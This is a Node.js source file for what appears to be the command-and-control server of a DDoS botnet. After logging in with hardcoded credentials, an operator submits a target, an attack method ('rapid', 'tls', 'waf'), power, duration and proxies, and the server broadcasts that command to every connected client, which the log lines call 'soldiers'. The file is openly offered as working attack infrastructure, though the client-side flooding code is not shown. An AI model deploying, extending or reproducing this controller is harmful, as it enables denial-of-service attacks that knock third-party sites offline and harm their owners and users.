const express = require('express');
const socketIo = require('socket.io');
const http = require('http');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const bodyParser = require('body-parser');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" },
  transports: ['websocket', 'polling']
});

// Irony layer
app.use(helmet());
app.use(bodyParser.urlencoded({ extended: false }));

// Store active sessions
const activeSessions = new Map();
const attackQueue = new Map();

// Login limiter (for realism)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 3,
  message: 'Too many login attempts'
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// LOGIN ROUTE - THE GATE
app.post('/login', loginLimiter, (req, res) => {
  const { id, password } = req.body;
  
  if (id === '77' && password === '77') {
    const sessionId = uuidv4();
    activeSessions.set(sessionId, {
      id: id,
      createdAt: Date.now(),
      lastActive: Date.now(),
      attackCount: 0
    });
    
    // Set session cookie
    res.cookie('session_id', sessionId, { 
      httpOnly: true, 
      sameSite: 'strict',
      maxAge: 24 * 60 * 60 * 1000 
    });
    
    return res.redirect('/dashboard.html');
  }
  
  return res.status(401).send(`
    <html><body style="background:#000;color:#f00;font-family:monospace;">
    ACCESS DENIED<br>
    ID/PASSWORD INVALID<br>
    <a href="/login.html" style="color:#0f0">RETRY</a>
    </body></html>
  `);
});

// Socket.IO Authentication Middleware
io.use((socket, next) => {
  const sessionId = socket.handshake.auth.sessionId;
  if (activeSessions.has(sessionId)) {
    const session = activeSessions.get(sessionId);
    session.lastActive = Date.now();
    session.connected = true;
    socket.sessionId = sessionId;
    socket.userId = session.id;
    next();
  } else {
    next(new Error('Unauthorized'));
  }
});

// Socket.IO Connection Handler
io.on('connection', (socket) => {
  console.log(`[+] Client connected: ${socket.id} | User: ${socket.userId}`);
  
  socket.emit('welcome', {
    message: 'CONNECTED TO ORCHESTRATOR',
    clients: io.engine.clientsCount,
    timestamp: Date.now()
  });
  
  // Receive attack commands
  socket.on('launch_attack', (attackConfig) => {
    const session = activeSessions.get(socket.sessionId);
    if (!session) return;
    
    // Validate attack config
    const validAttack = {
      id: uuidv4(),
      target: attackConfig.target.replace(/[<>]/g, ''),
      method: ['rapid', 'tls', 'waf'].includes(attackConfig.method) ? attackConfig.method : 'rapid',
      power: Math.min(Math.max(parseInt(attackConfig.power) || 1, 1), 100),
      duration: Math.min(Math.max(parseInt(attackConfig.duration) || 60, 10), 300),
      proxies: (attackConfig.proxies || '').split('\n').filter(p => p.trim().length > 0),
      timestamp: Date.now(),
      origin: socket.userId
    };
    
    // Broadcast to ALL connected clients
    io.emit('attack_command', validAttack);
    
    // Log it
    session.attackCount++;
    console.log(`[!] ATTACK LAUNCHED: ${validAttack.id} -> ${validAttack.target} via ${validAttack.method}`);
  });
  
  // Client reporting status
  socket.on('client_report', (data) => {
    console.log(`[Client Report] ${socket.id}: ${JSON.stringify(data)}`);
  });
  
  socket.on('disconnect', () => {
    console.log(`[-] Client disconnected: ${socket.id}`);
  });
});

// Health check endpoint (for Vercel)
app.get('/health', (req, res) => {
  res.json({
    status: 'operational',
    clients: io.engine.clientsCount,
    sessions: activeSessions.size,
    memory: process.memoryUsage(),
    uptime: process.uptime()
  });
});

// Clear old sessions every hour
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.lastActive > 24 * 60 * 60 * 1000) {
      activeSessions.delete(sessionId);
    }
  }
}, 60 * 60 * 1000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`[!] Orchestra conductor listening on port ${PORT}`);
  console.log(`[!] Login: ID=77 | PW=77`);
  console.log(`[!] Waiting for soldiers...`);
});